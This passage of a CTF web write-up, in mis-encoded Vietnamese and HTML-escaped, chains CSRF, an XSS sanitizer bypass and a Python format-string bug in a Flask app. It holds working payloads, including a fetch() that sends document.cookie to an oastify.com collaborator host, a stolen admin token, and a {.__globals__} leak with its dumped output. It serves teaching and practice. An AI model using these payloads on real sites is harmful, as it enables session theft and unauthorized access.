Äoáº¡n code render template nÃ y lÃ  route &lt;code&gt;/your-name&lt;/code&gt; báº±ng 1 POST request (tháº¿ thÃ¬ report cho bot kiá»ƒu chÃ³a gÃ¬)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def sanitize_input(input_string):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; input_string = input_string.replace(&amp;#39;&amp;lt;&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; input_string = input_string.replace(&amp;#39;&amp;gt;&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; input_string = input_string.replace(&amp;#39;\&amp;#39;&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; input_string = input_string.replace(&amp;#39;&amp;amp;&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; input_string = input_string.replace(&amp;#39;&amp;#34;&amp;#39;, &amp;#39;\\&amp;#34;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; input_string = input_string.replace(&amp;#39;:&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return input_string
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@app.route(&amp;#39;/your-name&amp;#39;, methods=[&amp;#39;POST&amp;#39;])
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def your_name():
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if request.method == &amp;#39;POST&amp;#39;:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; name = request.form.get(&amp;#39;name&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return Response(render_template(&amp;#39;your-name.html&amp;#39;, name=sanitize_input(name)), content_type=&amp;#39;text/html&amp;#39;)\
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vá»›i hÃ m sanitize_input, mÃ¬nh sáº½ khÃ´ng thá»ƒ thoÃ¡t khá»i Ä‘Æ°á»£c sá»± kiá»‡n onfocus hay má»Ÿ tháº» má»›i. NÃªn lÃºc nÃ y mÃ¬nh Ä‘Ã£ máº¥t khÃ¡ nhiá»u thá»i gian chá»‰ Ä‘á»ƒ Ä‘i tÃ¬m cÃ¡ch bypass, Ä‘i search mxss cá»§a firefox, xss trÃªn firefox cÃ¡c kiá»ƒu Ä‘á»ƒ nháº­n ra nÃ³ khÃ´ng hoáº¡t Ä‘á»™ng nhÆ° tháº¿ =)))
Äoáº¡n code report vÃ  visit nÃ³ váº«n giá»‘ng cÃ¡c chall XSS thÆ°á»ng tháº¥y nÃªn mÃ¬nh khÃ´ng nháº¯c Ä‘áº¿n ná»¯a, cÃ²n cÃ¢u há»i Ä‘áº·t ra lÃ  pháº£i report cho con bot nhÆ° nÃ o Ä‘á»ƒ nÃ³ POST Ä‘áº¿n /your-name thÃ¬ mÃ¬nh sáº½ dÃ¹ng CSRF.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MÃ¬nh táº¡o response cÃ³ chá»©a payload CSRF cÆ¡ báº£n trÃªn request repo:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;form action=&amp;#34;http://192.168.92.187:5000/your-name&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;name&amp;#34; value=&amp;#34;133337&amp;#34; /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/form&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; document.forms[0].submit();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/HkZe_JQsJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NÃ©m cho con bot link html nÃ y lÃ  Ä‘Æ°á»£c:
&lt;img src="https://hackmd.io/_uploads/SyWd_y7ikx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/rkg9_Jms1e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ÄÃ£ cÃ³ thá»ƒ Ä‘Æ°a cho con bot payload, giá» mÃ¬nh sáº½ tÃ¬m cÃ¡ch bypass XSS. MÃ¬nh Ä‘Ã£ nghÄ© khÃ´ng thá»ƒ nÃ o chÃ¨n thÃªm Ä‘Æ°á»£c cÃ¡i gÃ¬ vÃ o cÃ¡i URL kia, nÃªn Ã½ tÆ°á»Ÿng ban Ä‘áº§u cá»§a mÃ¬nh lÃ  trigger sá»± kiá»‡n onfocus báº±ng cÃ¡ch thÃªm fragment lÃ  id cá»§a tháº» Ä‘Ã³ vÃ o URL (&lt;a class="link" href="https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all" target="_blank" rel="noopener"
&gt;Document&lt;/a&gt;), sau Ä‘Ã³ XSS táº¡i trang mÃ  nÃ³ redirect sang lÃ  behindthename.com:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkxXFkQikg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Ai cÅ©ng biáº¿t lÃ  idea nÃ y khÃ´ng giÃ²n tÃ­ nÃ o, site kia khÃ´ng dÃ­nh XSS, cÅ©ng nhÆ° mÃ¬nh váº«n bá»‹ filter nÃªn khÃ´ng Ä‘iá»n Ä‘c payload tÃ¹y Ã½.
NhÃ¬n láº¡i filter, mÃ¬nh Ä‘Ã£ quÃªn máº¥t lÃ  nÃ³ khÃ´ng há» filter nhÃ¡y kÃ©p mÃ  chá»‰ thÃªm &lt;code&gt;\&lt;/code&gt; vÃ o trÆ°á»›c, mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ bypass báº±ng &lt;code&gt;\&amp;quot;&lt;/code&gt; rá»“i comment Ä‘oáº¡n Ä‘áº±ng sau láº¡i lÃ  cÃ³ thá»ƒ XSS:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1cpKkQjJe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
JS code sáº½ Ä‘Æ°á»£c trigger trÆ°á»›c khi redirect sang &lt;a class="link" href="https://www.behindthename.com/" target="_blank" rel="noopener"
&gt;https://www.behindthename.com/&lt;/a&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkOyqkXoJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Giá» thÃ¬ chá»‰ cáº§n fetch thÃ´i, lÆ°u Ã½ vÃ¬ chall cháº·n cáº£ &lt;code&gt;:&lt;/code&gt; nÃªn khi fetch cÃ³ thá»ƒ bá» &lt;code&gt;https:&lt;/code&gt; Ä‘i mÃ  chá»‰ cáº§n &lt;code&gt;//URL&lt;/code&gt; lÃ  Ä‘Æ°á»£c:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1zjn1Xo1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/HJ4ahk7ikx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Giá» thÃ¬ láº¥y token cá»§a bot thÃ´i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;form action=&amp;#34;http://127.0.0.1:5000/your-name#behindthename-redirect&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;name&amp;#34; value=&amp;#39;1\&amp;#34;;fetch(`//vvu7nop54qkhrr3xp05tf2qqjhp8dz1o.oastify.com/?1337=`+document.cookie)//&amp;#39; /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/form&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; document.forms[0].submit();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SkhzJe7skl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/BycDWxmo1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh Ä‘Ã£ cÃ³ X-Admin-Token lÃ  8657e9a9dec84afb8710a1a4a9e09efb&lt;/p&gt;
&lt;h3 id="format-string-python"&gt;Format String Python
&lt;/h3&gt;&lt;p&gt;Vá»›i X-Admin-Token, mÃ¬nh Ä‘Ã£ cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c route &lt;code&gt;/admin&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def run_cmd(): # I will do that later
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; pass
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@app.route(&amp;#39;/admin&amp;#39;, methods=[&amp;#39;GET&amp;#39;])
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def admin():
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if request.cookies.get(&amp;#39;X-Admin-Token&amp;#39;) != X_Admin_Token:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return &amp;#39;Access denied&amp;#39;, 403
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; prompt = request.args.get(&amp;#39;prompt&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return render_template(&amp;#39;admin.html&amp;#39;, cmd=f&amp;#34;{prompt if prompt else &amp;#39;prompt$/&amp;gt;&amp;#39;}{run_cmd()}&amp;#34;.format(run_cmd))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Route nÃ y nháº­n args tá»« URL lÃ  prompt, sau Ä‘Ã³ render ra giÃ¡ trá»‹ cmd vÃ  format 2 láº§n: 1 láº§n vá»›i &lt;code&gt;f&amp;quot;&amp;quot;&lt;/code&gt; vÃ  1 láº§n vá»›i &lt;code&gt;.format(run_cmd)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Káº¿t quáº£ sáº½ cÃ³ None bá»Ÿi vÃ¬ hÃ m run_cmd() khÃ´ng cháº¡y má»™t thá»© gÃ¬ cáº£&lt;/li&gt;
&lt;li&gt;Táº¡i láº§n Ä‘áº§u tiÃªn, náº¿u nhÆ° ta Ä‘á»ƒ &lt;code&gt;{}&lt;/code&gt; thÃ¬ táº¡i láº§n format thá»© 2 thá»© Ä‘Æ°á»£c thay vÃ o lÃ  hÃ m run_cmd, dáº«n Ä‘áº¿n viá»‡c xáº£y ra format string:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1yeXe7ikg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cá»™ng vá»›i viá»‡c flag Ä‘Æ°á»£c Ä‘á»ƒ trong environment, ta confirm Ä‘Ã¢y lÃ  lá»—i format string vÃ¬ vá»›i format string ta khÃ´ng thá»ƒ RCE.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r15Xmlmsyx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äáº§u tiÃªn mÃ¬nh cá»© nghÄ© lÃ  sáº½ khÃ´ng control Ä‘Æ°á»£c cÃ¡c attribute vÃ¬ mÃ¬nh cáº§n chÃ¨n vÃ o bÃªn format() vÃ­ dá»¥ nhÆ° &lt;code&gt;.format(run_cmd.__init__)&lt;/code&gt;, nhÆ°ng mÃ¬nh khÃ´ng ngá» lÃ  cÃ³ thá»ƒ call trá»±c tiáº¿p tá»« bÃªn trong pháº§n format (kiáº¿n thá»©c má»›i)
Giá» ta sáº½ Ä‘i tÃ¬m chain Ä‘á»ƒ tiáº¿n hÃ nh leak environment, ngon nháº¥t lÃ  &lt;code&gt;.__globals__[os].environ&lt;/code&gt;, tuy nhiÃªn táº¡i Ä‘Ã¢y thÃ¬ attribute globals khÃ´ng cÃ³ module os nÃªn ta pháº£i Ä‘i tÃ¬m cÃ¡i khÃ¡c váº­y:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkdJNxmiye.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
PhiÃªn báº£n Ä‘áº¹p hÆ¡n:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__name__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__doc__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__package__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__loader__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;_frozen_importlib_external&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SourceFileLoader&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0d982220&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__spec__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__annotations__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;builtins&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;built&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__file__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/app/app.py&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;__cached__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;Flask&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flask.app.Flask&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;render_template&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;render_template&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c5c7160&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;request&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://192.168.92.187:5000/admin?prompt={.__globals__}&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;Response&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flask.wrappers.Response&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;redirect&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;redirect&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c7591f0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;url_for&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;url_for&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c7c3f70&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;visit_report&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;visit_report&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c58d790&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;token_hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;token_hex&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0cb6e9d0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;X_Admin_Token&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;8657e9a9dec84afb8710a1a4a9e09efb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
